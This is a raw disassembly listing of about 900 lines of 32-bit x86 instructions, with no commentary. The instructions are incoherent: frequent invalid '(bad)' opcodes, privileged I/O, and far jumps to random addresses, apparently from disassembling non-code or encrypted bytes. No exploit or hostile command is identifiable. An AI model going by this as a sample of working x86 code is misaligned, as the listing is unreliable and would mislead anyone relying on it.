  40d405:	sbb    al,BYTE PTR [eax+edx*8+0x18]
  40d409:	lea    esi,[edi-0x71ff2971]
  40d40f:	push   edx
  40d410:	(bad)  
  40d411:	retf   
  40d412:	aam    0xd5
  40d414:	nop
  40d415:	sub    eax,0xca4ca72b
  40d41a:	xchg   edx,eax
  40d41b:	shl    DWORD PTR [edi],cl
  40d41d:	inc    ebp
  40d41e:	hlt    
  40d41f:	mov    ebx,0xbbe95a3b
  40d424:	add    al,0xfe
  40d426:	(bad)  
  40d428:	xchg   BYTE PTR [edx-0x668e6ec0],al
  40d42e:	js     0x40d3b3
  40d430:	pop    es
  40d431:	fwait
  40d432:	xchg   esp,eax
  40d433:	sub    al,0x96
  40d435:	inc    esi
  40d436:	jbe    0x40d482
  40d438:	sub    ah,BYTE PTR [edx]
  40d43a:	inc    esi
  40d43b:	or     BYTE PTR [esi-0x39],bl
  40d43e:	mov    dh,BYTE PTR [edi+eiz*2-0x4c22565d]
  40d445:	loop   0x40d43a
  40d447:	lahf   
  40d448:	pop    ds
  40d449:	cmp    al,0x3a
  40d44b:	adc    BYTE PTR [edx],dl
  40d44d:	sub    eax,0x74f14a2
  40d452:	jge    0x40d406
  40d454:	inc    edi
  40d455:	aam    0x5a
  40d457:	add    al,0x1c
  40d459:	fidiv  WORD PTR [ecx+0x79]
  40d45c:	test   eax,0x91bff61d
  40d462:	aad    0xe1
  40d464:	xor    edi,DWORD PTR [edx]
  40d466:	mov    bl,0xf1
  40d468:	jecxz  0x40d4a1
  40d46a:	mov    ds:0xec310db7,al
  40d46f:	retf   
  40d470:	xchg   ebp,eax
  40d471:	cwde   
  40d472:	adc    DWORD PTR [edx+0x4333b17e],edx
  40d478:	nop
  40d479:	inc    ebx
  40d47a:	mov    ah,0x23
  40d47c:	or     BYTE PTR [eax],ah
  40d47e:	mov    ecx,0x5b55bd06
  40d483:	clc    
  40d484:	mov    ds:0x776c5c8a,eax
  40d489:	std    
  40d48a:	lds    eax,FWORD PTR [ebp-0x75502b8f]
  40d490:	jge    0x40d4ee
  40d492:	loope  0x40d451
  40d494:	test   eax,ebp
  40d496:	push   ebx
  40d497:	push   ds
  40d498:	pop    esp
  40d499:	cmp    esi,esi
  40d49b:	ins    DWORD PTR es:[edi],dx
  40d49c:	xor    dh,ah
  40d49e:	adc    edx,ecx
  40d4a0:	rol    ebx,1
  40d4a2:	push   edi
  40d4a3:	cs jmp 0x845a:0x73370f9b
  40d4ab:	gs mov esp,0xcb95a380
  40d4b1:	mov    ch,0xdb
  40d4b3:	xor    edi,DWORD PTR [edx]
  40d4b5:	cmp    BYTE PTR [edi],dl
  40d4b7:	mov    ebp,0xdc1e55d7
  40d4bc:	add    al,0x70
  40d4be:	mov    esp,0x31e93af1
  40d4c3:	pop    esi
  40d4c4:	xchg   edi,eax
  40d4c5:	imul   si,WORD PTR [bx],0x40
  40d4ca:	scas   eax,DWORD PTR es:[edi]
  40d4cb:	imul   DWORD PTR ds:0x6ff9e871
  40d4d1:	dec    edi
  40d4d2:	clc    
  40d4d3:	out    0x1f,al
  40d4d5:	(bad)  
  40d4d7:	dec    edx
  40d4d8:	ins    DWORD PTR es:[edi],dx
  40d4d9:	jge    0x40d4d2
  40d4db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4dc:	push   ecx
  40d4dd:	mov    edx,0xb67c7096
  40d4e2:	mov    edx,0x842062cc
  40d4e7:	sahf   
  40d4e8:	adc    al,0x50
  40d4ea:	(bad)  
  40d4eb:	mov    cl,0xa6
  40d4ed:	inc    esp
  40d4ee:	jne    0x40d4ec
  40d4f0:	mov    dh,0x31
  40d4f2:	mov    cl,0xf
  40d4f4:	(bad)  
  40d4f5:	(bad)  
  40d4f6:	call   0x8e968dd8
  40d4fb:	out    dx,eax
  40d4fc:	es cdq 
  40d4fe:	ret    
  40d4ff:	sbb    DWORD PTR [eax+0x6e55fc73],0x50
  40d506:	sub    eax,0xb459b436
  40d50b:	adc    edi,eax
  40d50d:	cli    
  40d50e:	lock pop eax
  40d510:	push   cs
  40d511:	mov    esp,0xb6970d65
  40d516:	mov    ds:0xdbf5ca2e,al
  40d51b:	mov    al,ds:0xd63eaf83
  40d520:	inc    ebx
  40d521:	jno    0x40d4c2
  40d523:	fs nop
  40d525:	pop    esp
  40d526:	and    ah,ch
  40d528:	push   esp
  40d529:	(bad)
  40d52c:	les    ebx,FWORD PTR [edx+0x5aa0dc1b]
  40d532:	push   0xffffffd9
  40d534:	mov    al,BYTE PTR [esi]
  40d536:	xor    DWORD PTR [edx],eax
  40d538:	shl    edx,1
  40d53a:	fisttp QWORD PTR [esi]
  40d53c:	fcom   QWORD PTR [esi]
  40d53e:	inc    eax
  40d53f:	push   ss
  40d540:	xchg   ebp,eax
  40d541:	inc    ebp
  40d542:	popf   
  40d543:	outs   dx,DWORD PTR ds:[esi]
  40d544:	sbb    eax,0x18cda708
  40d549:	mov    edx,0xbed5c2c2
  40d54e:	leave  
  40d54f:	sti    
  40d550:	mov    es,WORD PTR [edi-0x3d]
  40d553:	mov    ecx,DWORD PTR [ebx]
  40d555:	mov    ds:0xc8ddb14,eax
  40d55a:	aaa    
  40d55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d55c:	mov    al,ds:0x5ccebe62
  40d561:	imul   edx,esp,0x39
  40d564:	(bad)  ds:0x5fc9de89
  40d56a:	lds    ebx,FWORD PTR [eax-0xa980028]
  40d570:	in     eax,0xa2
  40d572:	mov    ecx,0x34b54288
  40d577:	dec    ebp
  40d578:	xor    DWORD PTR [esi],eax
  40d57a:	loope  0x40d5ad
  40d57c:	icebp  
  40d57d:	daa    
  40d57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d57f:	enter  0x2536,0x89
  40d583:	jb     0x40d5fe
  40d585:	mov    ah,BYTE PTR [ecx+0x20]
  40d588:	jmp    0xbfdd:0xb58b6a44
  40d58f:	mov    dl,0xf
  40d591:	test   al,0x67
  40d593:	aas    
  40d594:	push   ds
  40d595:	idiv   DWORD PTR [ebp-0x42]
  40d598:	in     eax,0x3d
  40d59a:	sub    al,0x67
  40d59c:	jns    0x40d56d
  40d59e:	cld    
  40d59f:	ds cli 
  40d5a1:	or     DWORD PTR [ecx],ecx
  40d5a3:	push   ecx
  40d5a4:	lods   eax,DWORD PTR ds:[esi]
  40d5a5:	sub    bh,0x6b
  40d5a8:	test   DWORD PTR [eax-0x44],0x9dbd6b76
  40d5af:	jne    0x40d58a
  40d5b1:	lods   eax,DWORD PTR ds:[esi]
  40d5b2:	dec    eax
  40d5b3:	mul    DWORD PTR [edi+0x6fbc025]
  40d5b9:	pop    esi
  40d5ba:	daa    
  40d5bb:	jmp    0x12ea:0x6c52fe28
  40d5c2:	mov    edx,0x839f6306
  40d5c7:	inc    ebx
  40d5c8:	dec    edi
  40d5c9:	push   ds
  40d5ca:	jno    0x40d5bb
  40d5cc:	int    0x5a
  40d5ce:	ds push ebx
  40d5d0:	xor    edx,DWORD PTR [esi+ebp*4+0x73da4932]
  40d5d7:	or     bh,BYTE PTR [ebx]
  40d5d9:	jecxz  0x40d55e
  40d5db:	mov    eax,0xd1bb3f5a
  40d5e0:	ret    0x5a3f
  40d5e3:	scas   eax,DWORD PTR es:[edi]
  40d5e4:	sbb    al,0x30
  40d5e6:	leave  
  40d5e7:	cmp    BYTE PTR [edi+0x10245f53],bl
  40d5ed:	mov    esp,0xe2874a90
  40d5f2:	mov    ds:0xb209d862,eax
  40d5f7:	inc    esp
  40d5f8:	xor    BYTE PTR [edx+eiz*1-0x4d822a5f],bh
  40d5ff:	push   ecx
  40d600:	add    edi,DWORD PTR [esi-0x39103a9b]
  40d606:	dec    esp
  40d607:	sbb    DWORD PTR [eax],ebp
  40d609:	(bad)  
  40d60a:	fidivr DWORD PTR [edx-0x725f99b0]
  40d610:	or     eax,0x76e958a4
  40d615:	cmp    eax,edi
  40d617:	cld    
  40d618:	mul    eax
  40d61a:	jecxz  0x40d682
  40d61c:	push   ds
  40d61d:	ret    
  40d61e:	ss xchg edi,eax
  40d620:	xor    esi,DWORD PTR [esi-0x71]
  40d623:	jp     0x40d5e4
  40d625:	pushf  
  40d626:	jmp    0x1cc4:0xb2c69fdb
  40d62d:	sti    
  40d62e:	enter  0xca9,0x1c
  40d632:	lods   al,BYTE PTR ds:[esi]
  40d633:	data16 fsub DWORD PTR [eax+ecx*1+0x6]
  40d638:	inc    ebx
  40d639:	das    
  40d63a:	rcl    BYTE PTR [ebx+0x2b],1
  40d63d:	add    DWORD PTR [esi+esi*8],ecx
  40d640:	mov    al,0xf5
  40d642:	jno    0x40d616
  40d644:	ds push 0xa2da17e6
  40d64a:	mov    WORD PTR [ebx+0x40],cs
  40d64d:	loop   0x40d5ee
  40d64f:	xor    DWORD PTR [edx+0xe],ebx
  40d652:	and    DWORD PTR [edi],0xc6b771fd
  40d658:	adc    BYTE PTR ds:0x49b7c010,0xee
  40d65f:	bound  ecx,QWORD PTR [esi+0x40]
  40d662:	pop    ecx
  40d663:	dec    ecx
  40d664:	out    dx,al
  40d665:	(bad)  
  40d666:	lock and ch,BYTE PTR [esi-0x2f]
  40d66a:	pop    es
  40d66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d66c:	and    BYTE PTR [ebp+0x32d389ee],0x47
  40d673:	nop
  40d674:	popa   
  40d675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d676:	fistp  WORD PTR [edi+0x2e04f5b4]
  40d67c:	dec    ebp
  40d67d:	sbb    al,0x3a
  40d67f:	dec    edi
  40d680:	div    DWORD PTR [ecx+0x41f8736e]
  40d686:	add    edx,DWORD PTR [ebx+ebx*8]
  40d689:	or     al,0x22
  40d68b:	xchg   esi,eax
  40d68c:	inc    ecx
  40d68d:	and    eax,0x1f984e07
  40d692:	push   edx
  40d693:	data16 cmp al,0x70
  40d696:	mov    ecx,0x69d2a73b
  40d69b:	push   ebx
  40d69c:	cmp    ebx,DWORD PTR [esi]
  40d69e:	xchg   DWORD PTR [ebx+0x4970011a],eax
  40d6a4:	cdq    
  40d6a5:	(bad)  
  40d6a6:	adc    ecx,esp
  40d6a8:	div    BYTE PTR [edx-0x43]
  40d6ab:	mov    esp,0x9fc2d0e3
  40d6b0:	stos   BYTE PTR es:[edi],al
  40d6b1:	push   edi
  40d6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b3:	push   ss
  40d6b4:	cmc    
  40d6b5:	fnstenv [eax-0xf42ca03]
  40d6bb:	or     BYTE PTR [edx-0x2f4a9c38],dh
  40d6c1:	aas    
  40d6c2:	xchg   ebx,eax
  40d6c3:	inc    eax
  40d6c4:	aam    0xe4
  40d6c6:	nop
  40d6c7:	dec    ebp
  40d6c8:	mov    al,ds:0x2bade44b
  40d6cd:	jo     0x40d69b
  40d6cf:	and    ah,BYTE PTR [edx+0x78]
  40d6d2:	mov    dl,0x68
  40d6d4:	pop    es
  40d6d5:	mov    al,ds:0xd83f2e3e
  40d6da:	pop    edx
  40d6db:	pushf  
  40d6dc:	adc    eax,0xff9975d0
  40d6e1:	sbb    dh,bh
  40d6e3:	cli    
  40d6e4:	mov    ebp,ds
  40d6e6:	scas   eax,DWORD PTR es:[edi]
  40d6e7:	clc    
  40d6e8:	movups XMMWORD PTR [edi+ebx*4-0x33c07822],xmm6
  40d6f0:	dec    ebp
  40d6f1:	stc    
  40d6f2:	sar    DWORD PTR [ecx-0x2109725a],1
  40d6f8:	pop    edx
  40d6f9:	jp     0x40d75e
  40d6fb:	sbb    eax,0x483d9d2b
  40d700:	dec    ebx
  40d701:	clc    
  40d702:	jbe    0x40d782
  40d704:	imul   ebx,DWORD PTR [ebx+0x4c41d7e5],0xffffffc9
  40d70b:	adc    al,0xec
  40d70d:	sbb    DWORD PTR [bp+di],edi
  40d710:	mov    esp,DWORD PTR [edi+0x7583920]
  40d716:	ret    0x8c04
  40d719:	jo     0x40d6df
  40d71b:	hlt    
  40d71c:	stos   DWORD PTR es:[edi],eax
  40d71d:	je     0x40d6ba
  40d71f:	loopne 0x40d764
  40d721:	inc    DWORD PTR [esp+edx*8+0x4319c4d1]
  40d728:	hlt    
  40d729:	add    eax,0x5e814b2b
  40d72e:	cld    
  40d72f:	mov    edi,0xc2a56ae7
  40d734:	xchg   edx,eax
  40d735:	sbb    BYTE PTR [ecx],dh
  40d737:	mov    edi,ebx
  40d739:	inc    edi
  40d73a:	pop    ecx
  40d73b:	shl    BYTE PTR [ebx],1
  40d73d:	sbb    al,0x35
  40d73f:	in     eax,0xc9
  40d741:	fld    QWORD PTR [ebp-0x24d8ab16]
  40d747:	lahf   
  40d748:	lods   al,BYTE PTR ds:[esi]
  40d749:	xchg   ecx,eax
  40d74a:	add    edx,DWORD PTR [esi+0x1a]
  40d74d:	jmp    0x4be9f819
  40d752:	jo     0x40d6dc
  40d754:	icebp  
  40d755:	jg     0x40d7d0
  40d757:	dec    eax
  40d758:	(bad)  
  40d759:	(bad)  
  40d75a:	fs aam 0x4f
  40d75d:	mov    ch,0xee
  40d75f:	fld    DWORD PTR [ecx]
  40d761:	fcomp  QWORD PTR [edx-0x11]
  40d764:	test   al,0x58
  40d766:	dec    edi
  40d767:	dec    ebp
  40d768:	cs xchg esi,eax
  40d76a:	inc    edi
  40d76b:	(bad)  
  40d76c:	mov    cl,0xae
  40d76e:	sbb    eax,0x67e89f0d
  40d773:	fnsave [ecx+0x4c]
  40d776:	out    dx,al
  40d777:	iret   
  40d778:	mov    bl,bl
  40d77a:	jmp    0x2fb855df
  40d77f:	ins    BYTE PTR es:[edi],dx
  40d780:	mov    WORD PTR [esi-0x289130c7],es
  40d786:	dec    ecx
  40d787:	cmp    DWORD PTR [eax+0x6a093de7],ecx
  40d78d:	leave  
  40d78e:	lea    eax,[esi-0x5c69b247]
  40d794:	aas    
  40d795:	lock pop esp
  40d797:	push   ds
  40d798:	and    ebp,DWORD PTR [edx-0x6fc300bc]
  40d79e:	cmp    bl,ah
  40d7a0:	(bad)
  40d7a3:	fistp  QWORD PTR [ebp-0x7d5aca13]
  40d7a9:	rcl    DWORD PTR [edx-0x14],cl
  40d7ac:	cwde   
  40d7ad:	shl    al,1
  40d7af:	inc    ebx
  40d7b0:	mov    esp,0xaced5a9f
  40d7b5:	jmp    0xe9c86255
  40d7ba:	mov    esp,0x73f92d7a
  40d7bf:	retf   
  40d7c0:	mov    bl,BYTE PTR [ebp-0x29]
  40d7c3:	fild   DWORD PTR [ebp-0x14f07aef]
  40d7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7ca:	daa    
  40d7cb:	call   esp
  40d7cd:	stc    
  40d7ce:	push   0x34043d63
  40d7d3:	xlat   BYTE PTR ds:[ebx]
  40d7d4:	jle    0x40d811
  40d7d6:	jo     0x40d822
  40d7d8:	les    edx,FWORD PTR [esi+0x6d]
  40d7db:	repz popa 
  40d7dd:	movd   DWORD PTR [edi+0x14],mm4
  40d7e1:	arpl   WORD PTR [eax],bx
  40d7e3:	inc    esp
  40d7e4:	enter  0xd8f6,0xc7
  40d7e8:	add    esi,DWORD PTR [ebx+0x12]
  40d7eb:	mov    edx,0xedf989a3
  40d7f0:	pop    esi
  40d7f1:	pop    edi
  40d7f2:	inc    eax
  40d7f3:	xchg   ecx,eax
  40d7f4:	mov    ds:0x3496777c,al
  40d7f9:	cs ins DWORD PTR es:[edi],dx
  40d7fb:	outs   dx,DWORD PTR ds:[esi]
  40d7fc:	pop    edx
  40d7fd:	xchg   esi,eax
  40d7fe:	add    BYTE PTR [ecx+ebx*8-0x40],ah
  40d802:	or     ecx,DWORD PTR [ebx+0x3d]
  40d805:	xor    edi,DWORD PTR [eax+0x74ee7b6e]
  40d80b:	call   0xb1b5:0x559a0653
  40d812:	loop   0x40d7ad
  40d814:	nop
  40d815:	ds push cs
  40d817:	mov    cx,0xa72c
  40d81b:	dec    edi
  40d81c:	aam    0xf9
  40d81e:	jge    0x40d808
  40d820:	popf   
  40d821:	pand   mm5,QWORD PTR [esi-0xd]
  40d825:	sbb    eax,0x57ca6efb
  40d82a:	and    BYTE PTR [eax-0x39c967a1],ah
  40d830:	dec    edi
  40d831:	ret    0xb761
  40d834:	fwait
  40d835:	sub    eax,esp
  40d837:	pop    ebp
  40d838:	mov    edx,0x4af37ffb
  40d83d:	xor    cl,BYTE PTR [edx+eax*1+0xb12273b]
  40d844:	loop   0x40d8a0
  40d846:	aad    0xbf
  40d848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d849:	add    eax,0x7aa67e8a
  40d84e:	sbb    eax,0x537df9ff
  40d853:	and    ebx,DWORD PTR [edx-0x18]
  40d856:	imul   ebx,DWORD PTR [eax-0x4],0x747ec943
  40d85d:	add    bl,BYTE PTR [edx+eax*2+0x4d]
  40d861:	add    DWORD PTR [ecx+eax*1+0x3de7921d],edi
  40d868:	push   esp
  40d869:	pushf  
  40d86a:	aam    0xad
  40d86c:	ds mov ch,0xd4
  40d86f:	fwait
  40d870:	xor    al,0xf3
  40d872:	sbb    ecx,DWORD PTR [eax]
  40d874:	mov    eax,ds:0xa71452ea
  40d879:	mov    bh,BYTE PTR [edi+0x2]
  40d87c:	xchg   ebx,eax
  40d87d:	mov    ch,0x71
  40d87f:	(bad)  
  40d880:	lahf   
  40d881:	push   0xa6d77e90
  40d886:	pushf  
  40d887:	pushf  
  40d888:	or     ch,BYTE PTR [edi]
  40d88a:	sahf   
  40d88b:	(bad)  
  40d88e:	sti    
  40d88f:	jo     0x40d85f
  40d891:	xor    ebp,eax
  40d893:	sub    dl,BYTE PTR [edx]
  40d895:	(bad)  
  40d896:	dec    esp
  40d897:	xor    eax,0xbb2128d
  40d89c:	inc    ebx
  40d89d:	mov    edi,0xc14f833f
  40d8a2:	cmp    edi,DWORD PTR [esi+ebx*1]
  40d8a5:	mov    ds:0xf42eda8f,al
  40d8aa:	push   bx
  40d8ac:	dec    eax
  40d8ad:	mov    eax,ds:0x4437e135
  40d8b2:	mov    dh,bl
  40d8b4:	icebp  
  40d8b5:	jle    0x40d840
  40d8b7:	hlt    
  40d8b8:	xlat   BYTE PTR ds:[ebx]
  40d8b9:	sbb    eax,0xf97021d2
  40d8be:	mov    al,0xe3
  40d8c0:	rol    DWORD PTR [ebx],0xac
  40d8c3:	outs   dx,BYTE PTR ds:[esi]
  40d8c4:	xchg   BYTE PTR [edx+0x18],dh
  40d8c7:	push   edx
  40d8c8:	aam    0xcb
  40d8ca:	or     BYTE PTR [ebx+0x7dee06fb],dl
  40d8d0:	les    ecx,FWORD PTR [eax-0x51216d0f]
  40d8d6:	retf   0xe54e
  40d8d9:	in     al,dx
  40d8da:	loope  0x40d8a1
  40d8dc:	out    dx,eax
  40d8dd:	out    dx,eax
  40d8de:	sbb    al,0x31
  40d8e0:	jl     0x40d892
  40d8e2:	fs inc edi
  40d8e4:	not    ah
  40d8e6:	jnp    0x40d8c1
  40d8e8:	fnstcw WORD PTR [ebx+0x25]
  40d8eb:	outs   dx,DWORD PTR ds:[esi]
  40d8ec:	adc    DWORD PTR [ebp-0x3d2356d8],esi
  40d8f2:	xchg   ecx,eax
  40d8f3:	outs   dx,BYTE PTR ds:[esi]
  40d8f4:	xchg   BYTE PTR [edi+eiz*1+0x67c16e39],ah
  40d8fb:	popa   
  40d8fc:	arpl   WORD PTR [edx],ax
  40d8fe:	xor    al,0x78
  40d900:	daa    
  40d901:	mov    al,ds:0x77ff3a7c
  40d906:	dec    ebx
  40d907:	enter  0xd39b,0x62
  40d90b:	mov    al,0x42
  40d90d:	xchg   esi,eax
  40d90e:	jne    0x40d8a3
  40d910:	cs out 0x75,eax
  40d913:	xchg   edi,eax
  40d914:	clc    
  40d915:	pop    edx
  40d916:	xchg   ebp,eax
  40d917:	xor    BYTE PTR [ecx+edx*4],cl
  40d91a:	ror    BYTE PTR [eax],0x8
  40d91d:	out    dx,eax
  40d91e:	call   0x1c78:0xa75f6d90
  40d925:	test   BYTE PTR [eax+edx*1-0x65],ch
  40d929:	xor    ecx,ecx
  40d92b:	pop    ebp
  40d92c:	cmp    DWORD PTR [edi],ebx
  40d92e:	dec    ecx
  40d92f:	in     al,dx
  40d930:	dec    ecx
  40d931:	add    eax,0xaeb543c
  40d936:	xchg   ebx,eax
  40d937:	lock (bad) 
  40d939:	fdiv   QWORD PTR ds:0x989f9dde
  40d93f:	popf   
  40d940:	cld    
  40d941:	push   edx
  40d942:	shl    DWORD PTR [esi+ebp*1],cl
  40d945:	int3   
  40d946:	xor    DWORD PTR [esi+0x42],edi
  40d949:	popa   
  40d94a:	or     DWORD PTR [eax+ebx*2],0x6e
  40d94e:	and    eax,0x51321371
  40d953:	or     ebp,DWORD PTR [ebx]
  40d955:	mov    al,ds:0xd1c07e3e
  40d95a:	hlt    
  40d95b:	xor    cl,0x1c
  40d95e:	imul   ebx,edx,0x5c43135e
  40d964:	jmp    0xa701507c
  40d969:	push   edx
  40d96a:	and    DWORD PTR [esi-0x17],esp
  40d96d:	mov    edx,0xde2bc401
  40d972:	xchg   ebx,eax
  40d973:	ror    BYTE PTR [edi+0x6b],0x4
  40d977:	push   ebx
  40d978:	inc    DWORD PTR [ebx-0x53]
  40d97b:	div    ch
  40d97d:	aaa    
  40d97e:	int3   
  40d97f:	xchg   BYTE PTR [edi-0x5530991b],dh
  40d985:	inc    eax
  40d986:	jae    0x40d986
  40d988:	mov    ebp,0x3a1c428a
  40d98d:	and    cl,BYTE PTR [ebx+0x1c253f5]
  40d993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d994:	out    0x26,eax
  40d996:	jne    0x40d99f
  40d998:	sar    DWORD PTR [esi+0x1fa3ede6],1
  40d99e:	out    dx,eax
  40d99f:	sahf   
  40d9a0:	rcr    DWORD PTR [edx],cl
  40d9a2:	sbb    al,0x14
  40d9a4:	mov    edx,0xe6dfcc43
  40d9a9:	cli    
  40d9aa:	daa    
  40d9ab:	test   eax,esp
  40d9ad:	stc    
  40d9ae:	lea    ebx,[ebx+edx*2-0x36]
  40d9b2:	out    0xda,eax
  40d9b4:	sub    DWORD PTR [ecx+edx*1],edi
  40d9b7:	inc    edi
  40d9b8:	fbld   TBYTE PTR [ecx+0x43d534a3]
  40d9be:	jg     0x40d95c
  40d9c0:	inc    ebx
  40d9c1:	ins    BYTE PTR es:[edi],dx
  40d9c2:	(bad)  
  40d9c3:	hlt    
  40d9c4:	loop   0x40d9ba
  40d9c6:	lods   al,BYTE PTR ds:[esi]
  40d9c7:	and    BYTE PTR [edi],bh
  40d9c9:	call   0xef69:0xf10527e4
  40d9d0:	inc    esi
  40d9d1:	in     al,0xb4
  40d9d3:	or     cl,BYTE PTR [edx+0x7507b31d]
  40d9d9:	ja     0x40d99e
  40d9db:	sub    al,0x19
  40d9dd:	stos   BYTE PTR es:[edi],al
  40d9de:	or     DWORD PTR [ebx*2+0x39c3405b],eax
  40d9e5:	aad    0x5a
  40d9e7:	cmc    
  40d9e8:	cmp    al,0x90
  40d9ea:	mov    BYTE PTR [eax-0x15a94333],al
  40d9f0:	mov    eax,ds:0x2d65135f
  40d9f5:	xor    esi,eax
  40d9f7:	iret   
  40d9f8:	call   0x120f:0xeb8a1db9
  40d9ff:	imul   eax,edx,0x6ab342a9
  40da05:	(bad)  
  40da07:	pop    edx
  40da08:	mov    al,ds:0xfc2d48f6
  40da0d:	pusha  
  40da0e:	shl    DWORD PTR [esi],cl
  40da10:	aaa    
  40da11:	(bad)  
  40da12:	les    ecx,FWORD PTR [eax+0x6f]
  40da15:	lahf   
  40da16:	and    ah,BYTE PTR [eax]
  40da18:	push   cs
  40da19:	ret    
  40da1a:	retf   0x8605
  40da1d:	dec    ebp
  40da1e:	aad    0x3b
  40da20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da21:	dec    ecx
  40da22:	clc    
  40da23:	jp     0x40d9bb
  40da25:	adc    DWORD PTR ds:0xd03d5708,ebp
  40da2b:	pop    edi
  40da2c:	sub    bh,BYTE PTR [esi]
  40da2e:	stos   BYTE PTR es:[edi],al
  40da2f:	(bad)  
  40da30:	cmp    esi,DWORD PTR [edx-0xb]
  40da33:	pop    eax
  40da34:	add    BYTE PTR [eax-0x22],dh
  40da37:	or     edi,DWORD PTR [ebp-0x310c4aed]
  40da3d:	imul   DWORD PTR [esi-0x5cf16b05]
  40da43:	xchg   esp,eax
  40da44:	push   esi
  40da45:	push   edi
  40da46:	dec    esp
  40da47:	push   ebp
  40da48:	sahf   
  40da49:	mov    eax,0xd6cf75c0
  40da4e:	test   al,0x29
  40da50:	ficom  DWORD PTR [eax+0x66fc9645]
  40da56:	push   cs
  40da57:	inc    edx
  40da58:	xchg   ecx,eax
  40da59:	test   eax,0xb93cfee7
  40da5e:	cdq    
  40da5f:	dec    ebx
  40da60:	call   0x168c:0xf833e296
  40da67:	loope  0x40dac7
  40da69:	cdq    
  40da6a:	and    DWORD PTR [ebx],edx
  40da6c:	retf   0xf73c
  40da6f:	pop    eax
  40da70:	(bad)  
  40da71:	ja     0x40da39
  40da73:	stos   BYTE PTR es:[edi],al
  40da74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da75:	sbb    DWORD PTR es:[esi],esi
  40da78:	cmc    
  40da79:	add    eax,0xe47a9787
  40da7e:	popf   
  40da7f:	dec    esi
  40da80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da81:	adc    eax,0xae0b912f
  40da86:	sub    bh,BYTE PTR [esi]
  40da88:	icebp  
  40da89:	xor    dl,BYTE PTR [edi]
  40da8b:	nop
  40da8c:	dec    edx
  40da8d:	lds    edx,FWORD PTR [ecx+0x7377729b]
  40da93:	inc    esi
  40da94:	adc    BYTE PTR ds:[ebx+0x71],ah
  40da98:	xchg   ebp,eax
  40da99:	aaa    
  40da9a:	push   es
  40da9b:	js     0x40da56
  40da9d:	ins    DWORD PTR es:[di],dx
  40da9f:	push   ebx
  40daa0:	push   ebx
  40daa1:	shr    BYTE PTR [esi],1
  40daa3:	fidivr WORD PTR [esi+0x75]
  40daa6:	les    esp,FWORD PTR [eax]
  40daa8:	fsubr  st(4),st
  40daaa:	cs popa 
  40daac:	aas    
  40daad:	(bad)  
  40daae:	leave  
  40daaf:	retf   
  40dab0:	int    0x2
  40dab2:	call   0xd2ef:0xab4c4175
  40dab9:	jmp    0x40db28
  40dabb:	adc    BYTE PTR [edi],al
  40dabd:	(bad)  
  40dabe:	or     al,0x22
  40dac0:	dec    eax
  40dac1:	cmc    
  40dac2:	xchg   BYTE PTR [ebx-0x18],ah
  40dac5:	(bad)  
  40dac6:	cmp    eax,0x8e9b3785
  40dacb:	ins    DWORD PTR es:[edi],dx
  40dacc:	ins    BYTE PTR es:[edi],dx
  40dacd:	adc    al,0x4e
  40dacf:	aaa    
  40dad0:	loope  0x40daa8
  40dad2:	mov    cs,ebx
  40dad4:	outs   dx,BYTE PTR ds:[esi]
  40dad5:	(bad)  
  40dad6:	scas   eax,DWORD PTR es:[edi]
  40dad7:	or     al,0x62
  40dad9:	or     eax,0xd2dfdc4c
  40dade:	mov    edi,0x50a88504
  40dae3:	iret   
  40dae4:	inc    esp
  40dae5:	aaa    
  40dae6:	es xchg dh,dh
  40dae9:	imul   esp,DWORD PTR [esi],0x38abe524
  40daef:	dec    esp
  40daf0:	inc    esp
  40daf1:	js     0x882f4ea7
  40daf7:	add    eax,0xf4fefae4
  40dafc:	add    eax,0xb674b0ed
  40db01:	ja     0x40db09
  40db03:	mov    ds,WORD PTR [edx-0x6c]
  40db06:	jne    0x40dab0
  40db08:	ds mov ch,0x16
  40db0b:	out    dx,al
  40db0c:	js     0x40daf1
  40db0e:	iret   
  40db0f:	pop    es
  40db10:	rcr    DWORD PTR [edi],0x72
  40db13:	cwde   
  40db14:	pop    ecx
  40db15:	and    eax,0x841550ef
  40db1a:	adc    BYTE PTR [eax-0x17d49c3e],ah
  40db20:	or     al,BYTE PTR [edi+eax*1-0xe]
  40db24:	jno    0x40db76
  40db26:	mov    esi,0xba57d150
  40db2b:	and    eax,0x3984d581
  40db30:	and    ecx,DWORD PTR [esi+esi*4]
  40db33:	fidiv  WORD PTR [ebx+ecx*1]
  40db36:	lods   al,BYTE PTR ds:[esi]
  40db37:	mov    eax,0xdd31e583
  40db3c:	mov    ebp,0x4ebaf999
  40db41:	imul   DWORD PTR [edx-0xcf343eb]
  40db47:	mov    ebp,0x6187e4f9
  40db4c:	or     al,0x34
  40db4e:	idiv   ecx
  40db50:	cdq    
  40db51:	mov    esi,ebx
  40db53:	mov    eax,ds:0xce63f78d
  40db58:	retf   
  40db59:	mov    cl,0xc1
  40db5b:	sub    al,0x68
  40db5d:	adc    eax,0x334a7982
  40db62:	xchg   ecx,eax
  40db63:	xor    BYTE PTR [edi-0x4fafa5b6],ah
  40db69:	pop    ebx
  40db6a:	mov    bl,BYTE PTR [eax]
  40db6c:	push   0x2c16e3a
  40db71:	sub    DWORD PTR [edx+0x8aa1a84],eax
  40db77:	jo     0x40db84
  40db79:	add    ebp,ebp
  40db7b:	sbb    esp,DWORD PTR [esi+eax*2]
  40db7e:	imul   ebp,eax,0xdcbc9a9b
  40db84:	lods   al,BYTE PTR ds:[esi]
  40db85:	or     BYTE PTR ds:0xf5320a10,cl
  40db8b:	into   
  40db8c:	out    0x54,al
  40db8e:	push   edi
  40db8f:	call   0x2a59:0xc67fafa3
  40db96:	cmp    BYTE PTR [eax],dh
  40db98:	dec    edx
  40db99:	dec    ecx
  40db9a:	adc    eax,0x9f16a6e8
  40db9f:	or     DWORD PTR [edx+ebp*8-0x65e15166],0x17ad157b
  40dbaa:	aad    0x24
  40dbac:	sti    
  40dbad:	inc    eax
